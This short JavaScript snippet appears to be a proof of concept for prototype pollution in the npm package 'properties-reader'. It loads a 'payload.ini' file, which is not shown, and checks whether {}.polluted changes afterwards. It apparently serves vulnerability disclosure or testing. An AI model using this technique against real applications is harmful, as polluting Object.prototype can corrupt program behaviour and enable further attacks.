var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const propertiesReader = require('properties-reader');
const path = require('path');
console.log({}.polluted);
propertiesReader(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);